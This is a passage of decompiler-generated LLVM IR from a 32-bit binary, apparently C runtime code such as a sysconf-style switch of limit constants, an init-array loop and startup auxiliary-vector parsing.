    i32 34, label %dec_label_pc_805355c
    i32 35, label %dec_label_pc_8053540
    i32 36, label %dec_label_pc_805356f
    i32 37, label %dec_label_pc_8053576
    i32 38, label %dec_label_pc_805356f
    i32 39, label %dec_label_pc_80534b9
    i32 40, label %dec_label_pc_805357d
    i32 41, label %dec_label_pc_805355c
    i32 42, label %dec_label_pc_8053547
    i32 43, label %dec_label_pc_8053576
    i32 44, label %dec_label_pc_8053584
    i32 45, label %dec_label_pc_8053576
    i32 46, label %dec_label_pc_8053532
    i32 47, label %dec_label_pc_8053532
    i32 48, label %dec_label_pc_8053532
    i32 49, label %dec_label_pc_805355c
    i32 50, label %dec_label_pc_805355c
    i32 51, label %dec_label_pc_8053532
    i32 52, label %dec_label_pc_8053532
    i32 53, label %dec_label_pc_805355c
    i32 54, label %dec_label_pc_805355c
    i32 55, label %dec_label_pc_805355c
    i32 56, label %dec_label_pc_805355c
    i32 57, label %dec_label_pc_805355c
    i32 58, label %dec_label_pc_805355c
    i32 59, label %dec_label_pc_805355c
    i32 60, label %dec_label_pc_805355c
    i32 61, label %dec_label_pc_805355c
    i32 62, label %dec_label_pc_805355c
    i32 63, label %dec_label_pc_805355c
    i32 64, label %dec_label_pc_805355c
    i32 65, label %dec_label_pc_805355c
    i32 66, label %dec_label_pc_805355c
    i32 67, label %dec_label_pc_805345d
    i32 68, label %dec_label_pc_805345d
    i32 69, label %dec_label_pc_8053540
    i32 70, label %dec_label_pc_8053540
    i32 71, label %dec_label_pc_8053540
    i32 72, label %dec_label_pc_8053547
    i32 73, label %dec_label_pc_805354e
    i32 74, label %dec_label_pc_8053555
    i32 75, label %dec_label_pc_80534c3
    i32 76, label %dec_label_pc_8053555
    i32 77, label %dec_label_pc_805345d
    i32 78, label %dec_label_pc_805345d
    i32 79, label %dec_label_pc_805345d
    i32 80, label %dec_label_pc_805345d
    i32 81, label %dec_label_pc_805345d
    i32 82, label %dec_label_pc_805345d
    i32 83, label %dec_label_pc_805345d
    i32 84, label %dec_label_pc_805345d
    i32 85, label %dec_label_pc_805355c
    i32 86, label %dec_label_pc_805355c
    i32 87, label %dec_label_pc_8053539
    i32 88, label %dec_label_pc_80534cd
    i32 89, label %dec_label_pc_80534d7
    i32 90, label %dec_label_pc_805354e
    i32 91, label %dec_label_pc_805345d
    i32 92, label %dec_label_pc_805345d
    i32 93, label %dec_label_pc_805345d
    i32 94, label %dec_label_pc_805345d
    i32 95, label %dec_label_pc_8053532
    i32 96, label %dec_label_pc_805355c
    i32 97, label %dec_label_pc_805355c
    i32 98, label %dec_label_pc_805345d
    i32 99, label %dec_label_pc_805345d
    i32 100, label %dec_label_pc_805345d
    i32 101, label %dec_label_pc_80534e1
    i32 102, label %dec_label_pc_8053524
    i32 103, label %dec_label_pc_8053561
    i32 104, label %dec_label_pc_8053539
    i32 105, label %dec_label_pc_80534eb
    i32 106, label %dec_label_pc_8053547
    i32 107, label %dec_label_pc_8053547
    i32 108, label %dec_label_pc_805352b
    i32 109, label %dec_label_pc_8053568
    i32 110, label %dec_label_pc_8053584
    i32 111, label %dec_label_pc_8053524
    i32 112, label %dec_label_pc_8053561
    i32 113, label %dec_label_pc_8053584
    i32 114, label %dec_label_pc_80534f5
    i32 115, label %dec_label_pc_805357d
    i32 116, label %dec_label_pc_805355c
    i32 117, label %dec_label_pc_805355c
    i32 118, label %dec_label_pc_80534ff
    i32 119, label %dec_label_pc_8053509
    i32 120, label %dec_label_pc_8053576
    i32 121, label %dec_label_pc_8053539
    i32 122, label %dec_label_pc_8053539
    i32 123, label %dec_label_pc_8053539
    i32 124, label %dec_label_pc_8053539
    i32 125, label %dec_label_pc_805345d
    i32 126, label %dec_label_pc_805345d
    i32 127, label %dec_label_pc_805355c
    i32 128, label %dec_label_pc_805355c
    i32 129, label %dec_label_pc_805345d
    i32 130, label %dec_label_pc_805345d
    i32 131, label %dec_label_pc_805355c
    i32 149, label %dec_label_pc_8053510
  ]

dec_label_pc_805345d:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053467:                             ; preds = %dec_label_pc_8053448
  %v1_8053467 = call i32 @function_8050568(i32 ptrtoint (i32* @0 to i32))
  %v1_805346c = inttoptr i32 %v1_8053467 to i32*
  store i32 22, i32* %v1_805346c, align 4
  br label %dec_label_pc_805355c

dec_label_pc_8053477:                             ; preds = %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053481:                             ; preds = %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_805348b:                             ; preds = %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053495:                             ; preds = %dec_label_pc_8053448
  %v0_8053498 = call i32 @function_80501c4()
  br label %dec_label_pc_805349d

dec_label_pc_805349d:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053495
  br label %dec_label_pc_8053589

dec_label_pc_80534a7:                             ; preds = %dec_label_pc_8053448
  %v0_80534aa = call i32 @function_8053a48()
  br label %dec_label_pc_80534af

dec_label_pc_80534af:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_80534a7
  br label %dec_label_pc_8053589

dec_label_pc_80534b9:                             ; preds = %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_80534c3:                             ; preds = %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_80534cd:                             ; preds = %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_80534d7:                             ; preds = %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_80534e1:                             ; preds = %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_80534eb:                             ; preds = %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_80534f5:                             ; preds = %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_80534ff:                             ; preds = %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053509:                             ; preds = %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053510:                             ; preds = %dec_label_pc_8053448
  %v5_8053516 = call i32 @function_805398c(i32 1, %timespec* null, i32 149, i32 149)
  %v2_805351e = icmp slt i32 %v5_8053516, 0
  %v1_8053520 = icmp eq i1 %v2_805351e, false
  br i1 %v1_8053520, label %dec_label_pc_8053532, label %dec_label_pc_805355c

dec_label_pc_8053524:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_805352b:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053532:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053510
  br label %dec_label_pc_8053589

dec_label_pc_8053539:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053540:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053547:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_805354e:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053555:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_805355c:                             ; preds = %dec_label_pc_8053510, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053467
  br label %dec_label_pc_8053589

dec_label_pc_8053561:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053568:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_805356f:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053576:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_805357d:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053584:                             ; preds = %dec_label_pc_8053448, %dec_label_pc_8053448, %dec_label_pc_8053448
  br label %dec_label_pc_8053589

dec_label_pc_8053589:                             ; preds = %dec_label_pc_805357d, %dec_label_pc_8053576, %dec_label_pc_805356f, %dec_label_pc_8053568, %dec_label_pc_8053561, %dec_label_pc_8053555, %dec_label_pc_805354e, %dec_label_pc_8053547, %dec_label_pc_8053540, %dec_label_pc_8053539, %dec_label_pc_805352b, %dec_label_pc_8053524, %dec_label_pc_8053532, %dec_label_pc_8053509, %dec_label_pc_80534ff, %dec_label_pc_80534f5, %dec_label_pc_80534eb, %dec_label_pc_80534e1, %dec_label_pc_80534d7, %dec_label_pc_80534cd, %dec_label_pc_80534c3, %dec_label_pc_80534b9, %dec_label_pc_80534af, %dec_label_pc_805349d, %dec_label_pc_805348b, %dec_label_pc_8053481, %dec_label_pc_8053477, %dec_label_pc_805345d, %dec_label_pc_805355c, %dec_label_pc_8053584
  %v0_805358c = phi i32 [ 255, %dec_label_pc_805357d ], [ 2048, %dec_label_pc_8053576 ], [ 99, %dec_label_pc_805356f ], [ 20, %dec_label_pc_8053568 ], [ -128, %dec_label_pc_8053561 ], [ 1024, %dec_label_pc_8053555 ], [ 4, %dec_label_pc_805354e ], [ 32, %dec_label_pc_8053547 ], [ 256, %dec_label_pc_8053540 ], [ 2147483647, %dec_label_pc_8053539 ], [ 16, %dec_label_pc_805352b ], [ 127, %dec_label_pc_8053524 ], [ 200112, %dec_label_pc_8053532 ], [ 9, %dec_label_pc_8053509 ], [ 65535, %dec_label_pc_80534ff ], [ -32768, %dec_label_pc_80534f5 ], [ -2147483648, %dec_label_pc_80534eb ], [ 8, %dec_label_pc_80534e1 ], [ 500, %dec_label_pc_80534d7 ], [ 4096, %dec_label_pc_80534cd ], [ 16384, %dec_label_pc_80534c3 ], [ 1000, %dec_label_pc_80534b9 ], [ 32768, %dec_label_pc_80534af ], [ 6, %dec_label_pc_805349d ], [ 65536, %dec_label_pc_805348b ], [ 100, %dec_label_pc_8053481 ], [ 131072, %dec_label_pc_8053477 ], [ 1, %dec_label_pc_805345d ], [ -1, %dec_label_pc_805355c ], [ 32767, %dec_label_pc_8053584 ]
  ret i32 %v0_805358c

; uselistorder directives
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 1, 2, 3, 4 }
  uselistorder i32 -2147483648, { 4, 0, 5, 6, 1, 2, 3 }
  uselistorder i32 ()* @function_80501c4, { 1, 0 }
  uselistorder i32 149, { 2, 1, 3, 0 }
  uselistorder i32 130, { 1, 0 }
  uselistorder i32 129, { 2, 0, 1 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 125, { 1, 0 }
  uselistorder i32 124, { 2, 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 122, { 1, 0 }
  uselistorder i32 121, { 1, 0 }
  uselistorder i32 119, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 115, { 3, 0, 1, 2 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 1, 0 }
  uselistorder i32 111, { 1, 0 }
  uselistorder i32 110, { 1, 0 }
  uselistorder i32 109, { 1, 0 }
  uselistorder i32 108, { 1, 0 }
  uselistorder i32 107, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 105, { 1, 0 }
  uselistorder i32 103, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 98, { 1, 0 }
  uselistorder i32 96, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 94, { 1, 0 }
  uselistorder i32 93, { 1, 0 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32 91, { 1, 0 }
  uselistorder i32 90, { 1, 0 }
  uselistorder i32 89, { 1, 0 }
  uselistorder i32 87, { 1, 2, 0 }
  uselistorder i32 86, { 1, 0 }
  uselistorder i32 85, { 1, 0 }
  uselistorder i32 83, { 1, 0 }
  uselistorder i32 82, { 1, 0 }
  uselistorder i32 81, { 1, 0 }
  uselistorder i32 79, { 1, 0 }
  uselistorder i32 78, { 1, 0 }
  uselistorder i32 77, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 73, { 1, 0 }
  uselistorder i32 71, { 1, 0 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 66, { 1, 0 }
  uselistorder i32 65, { 1, 0, 2, 3 }
  uselistorder i32 63, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 50, { 1, 0 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 47, { 1, 0 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 38, { 1, 2, 0 }
  uselistorder i32 30, { 4, 1, 0, 2, 3 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 26, { 2, 1, 0 }
  uselistorder i32 25, { 1, 0 }
  uselistorder i32 23, { 2, 3, 1, 0 }
  uselistorder i32 19, { 3, 2, 0, 1 }
  uselistorder i32 18, { 1, 0 }
  uselistorder i32 13, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053589, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_805355c, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8053532, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80534af, { 1, 0 }
  uselistorder label %dec_label_pc_805349d, { 1, 0 }
}

define i32 @function_8053590() local_unnamed_addr {
dec_label_pc_8053590:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053590 = load i32, i32* @ebx, align 4
  store i32 %v0_8053590, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805d000.374 to i32), i32 -134598656), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805d000.374 to i32), i32 -134598656), i32 2), i32 0), label %dec_label_pc_80535a4, label %dec_label_pc_80535b1

dec_label_pc_80535a4:                             ; preds = %dec_label_pc_8053590, %dec_label_pc_80535a4
  %v1_80535ab6 = phi i32 [ %v1_80535ab, %dec_label_pc_80535a4 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805d000.374 to i32), i32 -134598656), i32 2), i32 -1), %dec_label_pc_8053590 ]
  store i32 ptrtoint (i32* @global_var_80535ab.375 to i32), i32* %stack_var_-16, align 4
  %v5_80535a4 = mul i32 %v1_80535ab6, 4
  %v6_80535a4 = add i32 %v5_80535a4, ptrtoint (i32* @global_var_805d000.374 to i32)
  %v7_80535a4 = inttoptr i32 %v6_80535a4 to i32*
  %v8_80535a4 = load i32, i32* %v7_80535a4, align 4
  call void @__pseudo_call(i32 %v8_80535a4)
  %v0_80535ab.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80535ab = add i32 %v0_80535ab.pre, -1
  store i32 %v1_80535ab, i32* %ebx.global-to-local, align 4
  %v10_80535ac = icmp eq i32 %v0_80535ab.pre, 0
  %v1_80535af = icmp eq i1 %v10_80535ac, false
  br i1 %v1_80535af, label %dec_label_pc_80535a4, label %dec_label_pc_80535b1

dec_label_pc_80535b1:                             ; preds = %dec_label_pc_80535a4, %dec_label_pc_8053590
  %v0_80535b1 = load i32, i32* @global_var_8063b14.376, align 4
  %v1_80535b6 = icmp eq i32 %v0_80535b1, 0
  br i1 %v1_80535b6, label %dec_label_pc_80535bc, label %dec_label_pc_80535ba

dec_label_pc_80535ba:                             ; preds = %dec_label_pc_80535b1
  %v0_80535ba = load i32, i32* %stack_var_-16, align 4
  %v1_80535ba = call i32 @unknown_0(i32 %v0_80535ba)
  br label %dec_label_pc_80535bc

dec_label_pc_80535bc:                             ; preds = %dec_label_pc_80535ba, %dec_label_pc_80535b1
  %v0_80535bc = load i32, i32* @global_var_8063b18.377, align 8
  %v1_80535c2 = icmp eq i32 %v0_80535bc, 0
  br i1 %v1_80535c2, label %dec_label_pc_80535cb, label %dec_label_pc_80535c6

dec_label_pc_80535c6:                             ; preds = %dec_label_pc_80535bc
  %v2_80535c8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80535c8, i32* %ebx.global-to-local, align 4
  %v0_80535c9 = load i32, i32* %stack_var_-16, align 4
  %v1_80535c9 = call i32 @unknown_0(i32 %v0_80535c9)
  br label %dec_label_pc_80535cb

dec_label_pc_80535cb:                             ; preds = %dec_label_pc_80535bc, %dec_label_pc_80535c6
  %v2_80535cb = load i32, i32* %stack_var_-16, align 4
  %v2_80535cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80535cc, i32* @edx, align 4
  ret i32 %v2_80535cb

; uselistorder directives
  uselistorder i32 %v1_80535ab, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80535cb, { 1, 0 }
  uselistorder label %dec_label_pc_80535a4, { 1, 0 }
}

define i32 @function_80535cf(i32 %arg1) local_unnamed_addr {
dec_label_pc_80535cf:
  ret i32 0
}

define i32 @function_80535d2(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80535d2:
  %v0_80535d2 = load i32, i32* @eax, align 4
  ret i32 %v0_80535d2
}

define i32 @function_80535d3() local_unnamed_addr {
dec_label_pc_80535d3:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_80535d3 = load i32, i32* @esi, align 4
  %v0_80535d4 = load i32, i32* @ebx, align 4
  %v0_80535d8 = load i32, i32* @eax, align 4
  store i32 %v0_80535d8, i32* @esi, align 4
  %v0_80535da = load i32, i32* @edx, align 4
  store i32 %v0_80535da, i32* @ebx, align 4
  %v4_80535df = call i32 @function_8050014(i32 %v0_80535d8, i32 1, i32 %tmp6)
  %v8_80535e7 = icmp eq i32 %v4_80535df, -1
  %v1_80535e8 = icmp eq i1 %v8_80535e7, false
  br i1 %v1_80535e8, label %dec_label_pc_8053603, label %dec_label_pc_80535ea

dec_label_pc_80535ea:                             ; preds = %dec_label_pc_80535d3
  %v0_80535ec = load i32, i32* @ebx, align 4
  %v5_80535f2 = call i32 @function_80502e4(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805c52c.378, i32 0, i32 0), i32 %v0_80535ec)
  %v1_80535fa = load i32, i32* @esi, align 4
  %v12_80535fa = icmp eq i32 %v5_80535f2, %v1_80535fa
  br i1 %v12_80535fa, label %dec_label_pc_8053603, label %dec_label_pc_80535fe

dec_label_pc_80535fe:                             ; preds = %dec_label_pc_80535ea
  %v0_80535fe = call i32 @function_8052ad4()
  br label %dec_label_pc_8053603

dec_label_pc_8053603:                             ; preds = %dec_label_pc_80535ea, %dec_label_pc_80535d3, %dec_label_pc_80535fe
  %v2_8053603 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80535d4, i32* @ebx, align 4
  store i32 %v0_80535d3, i32* @esi, align 4
  ret i32 %v2_8053603

; uselistorder directives
  uselistorder i32 ()* @function_8052ad4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053603, { 2, 0, 1 }
}

define i32 @function_8053607() local_unnamed_addr {
dec_label_pc_8053607:
  %v0_805360a = load i8, i8* @global_var_8063b1c.379, align 4
  %v1_805360a = icmp eq i8 %v0_805360a, 0
  %v1_8053611 = icmp eq i1 %v1_805360a, false
  br i1 %v1_8053611, label %dec_label_pc_8053607.dec_label_pc_8053643_crit_edge, label %dec_label_pc_8053613

dec_label_pc_8053607.dec_label_pc_8053643_crit_edge: ; preds = %dec_label_pc_8053607
  %v0_8053646.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8053643

dec_label_pc_8053613:                             ; preds = %dec_label_pc_8053607
  store i8 1, i8* @global_var_8063b1c.379, align 4
  store i32 4096, i32* @global_var_8063b10.380, align 16
  %v0_805363e = call i32 @function_8050644()
  br label %dec_label_pc_8053643

dec_label_pc_8053643:                             ; preds = %dec_label_pc_8053607.dec_label_pc_8053643_crit_edge, %dec_label_pc_8053613
  %v0_8053646 = phi i32 [ %v0_8053646.pre, %dec_label_pc_8053607.dec_label_pc_8053643_crit_edge ], [ %v0_805363e, %dec_label_pc_8053613 ]
  ret i32 %v0_8053646

; uselistorder directives
  uselistorder i8* @global_var_8063b1c.379, { 1, 0 }
  uselistorder label %dec_label_pc_8053643, { 1, 0 }
}

define i32 @function_8053647(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8053647:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8063b08.381, align 8
  store i32 %arg6, i32* @global_var_8063b18.377, align 8
  store i32 %arg4, i32* @ebp, align 4
  %v2_805367e = mul i32 %arg2, 4
  %v3_805367e = add i32 %tmp31, %v2_805367e
  store i32 %v3_805367e, i32* %edx.global-to-local, align 4
  %v1_8053681 = add i32 %v3_805367e, 4
  store i32 %v1_8053681, i32* @global_var_8063b0c.372, align 4
  %v3_8053689 = load i32, i32* %arg3, align 4
  %v14_8053689 = icmp eq i32 %v1_8053681, %v3_8053689
  %v1_805368b = icmp eq i1 %v14_8053689, false
  br i1 %v1_805368b, label %dec_label_pc_8053693, label %dec_label_pc_805368d

dec_label_pc_805368d:                             ; preds = %dec_label_pc_8053647
  store i32 %v3_805367e, i32* @global_var_8063b0c.372, align 4
  br label %dec_label_pc_8053693

dec_label_pc_8053693:                             ; preds = %dec_label_pc_8053647, %dec_label_pc_805368d
  %v0_8053693 = load i32, i32* @ecx, align 4
  store i32 %v0_8053693, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8053698 = ptrtoint i32* %stack_var_-136 to i32
  %v3_805369d = bitcast i32* %stack_var_-136 to i8*
  %v4_805369d = call i32 @function_805143c(i8* %v3_805369d, i32 0, i32 120)
  %v0_80536a2 = load i32, i32* @global_var_8063b0c.372, align 4
  br label %dec_label_pc_80536aa

dec_label_pc_80536aa:                             ; preds = %dec_label_pc_80536aa, %dec_label_pc_8053693
  %v0_80536aa = phi i32 [ %v1_80536ad, %dec_label_pc_80536aa ], [ %v0_80536a2, %dec_label_pc_8053693 ]
  %v1_80536aa = inttoptr i32 %v0_80536aa to i32*
  %v2_80536aa = load i32, i32* %v1_80536aa, align 4
  %v3_80536aa = icmp eq i32 %v2_80536aa, 0
  %v1_80536ad = add i32 %v0_80536aa, 4
  %v1_80536b0 = icmp eq i1 %v3_80536aa, false
  br i1 %v1_80536b0, label %dec_label_pc_80536aa, label %dec_label_pc_80536d1.preheader

dec_label_pc_80536d1.preheader:                   ; preds = %dec_label_pc_80536aa
  store i32 %v1_80536ad, i32* @ebx, align 4
  %v1_80536d11 = inttoptr i32 %v1_80536ad to i32*
  %v2_80536d12 = load i32, i32* %v1_80536d11, align 4
  %v3_80536d13 = icmp eq i32 %v2_80536d12, 0
  %v1_80536d410 = icmp eq i1 %v3_80536d13, false
  br i1 %v1_80536d410, label %dec_label_pc_80536b6.lr.ph, label %dec_label_pc_80536d6

dec_label_pc_80536b6.lr.ph:                       ; preds = %dec_label_pc_80536d1.preheader
  %v3_8053696 = ptrtoint i32* %stack_var_-168 to i32
  %v3_80536c1 = add i32 %v3_8053696, 32
  br label %dec_label_pc_80536b6

dec_label_pc_80536b6:                             ; preds = %dec_label_pc_80536b6.lr.ph, %dec_label_pc_80536ce
  %v1_80536c1 = phi i32 [ %v2_80536d12, %dec_label_pc_80536b6.lr.ph ], [ %v2_80536d1, %dec_label_pc_80536ce ]
  %v0_80536c0 = phi i32 [ %v1_80536ad, %dec_label_pc_80536b6.lr.ph ], [ %v1_80536ce, %dec_label_pc_80536ce ]
  %v6_80536bb = icmp ugt i32 %v1_80536c1, 14
  br i1 %v6_80536bb, label %dec_label_pc_80536ce, label %dec_label_pc_80536bd

dec_label_pc_80536bd:                             ; preds = %dec_label_pc_80536b6
  %v0_80536bd = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80536bd, i32* %stack_var_-160, align 4
  store i32 %v0_80536c0, i32* %stack_var_-168, align 4
  %v2_80536c1 = mul i32 %v1_80536c1, 8
  %v4_80536c1 = add i32 %v3_80536c1, %v2_80536c1
  %v3_80536c6 = inttoptr i32 %v4_80536c1 to i16*
  %v4_80536c6 = call i32 @function_8051414(i16* %v3_80536c6, i32 %v0_80536c0, i32 8)
  %v0_80536ce.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80536ce

dec_label_pc_80536ce:                             ; preds = %dec_label_pc_80536b6, %dec_label_pc_80536bd
  %v0_80536ce = phi i32 [ %v0_80536c0, %dec_label_pc_80536b6 ], [ %v0_80536ce.pre, %dec_label_pc_80536bd ]
  %v1_80536ce = add i32 %v0_80536ce, 8
  store i32 %v1_80536ce, i32* @ebx, align 4
  %v1_80536d1 = inttoptr i32 %v1_80536ce to i32*
  %v2_80536d1 = load i32, i32* %v1_80536d1, align 4
  %v3_80536d1 = icmp eq i32 %v2_80536d1, 0
  %v1_80536d4 = icmp eq i1 %v3_80536d1, false
  br i1 %v1_80536d4, label %dec_label_pc_80536b6, label %dec_label_pc_80536d6

dec_label_pc_80536d6:                             ; preds = %dec_label_pc_80536ce, %dec_label_pc_80536d1.preheader
  store i32 %v2_8053698, i32* @eax, align 4
  %v0_80536da = call i32 @function_8055268()
  store i32 %v0_80536da, i32* @eax, align 4
  %v0_80536df = call i32 @function_8053607()
  %v1_80536e8 = icmp eq i32 %tmp26, 0
  %v1_80536ea = icmp eq i1 %v1_80536e8, false
  br i1 %v1_80536ea, label %dec_label_pc_80536f0, label %dec_label_pc_80536ec

dec_label_pc_80536ec:                             ; preds = %dec_label_pc_80536d6
  %v1_80536ec = and i32 %tmp26, -65536
  %v2_80536ec = or i32 %v1_80536ec, 4096
  br label %dec_label_pc_80536f0

dec_label_pc_80536f0:                             ; preds = %dec_label_pc_80536d6, %dec_label_pc_80536ec
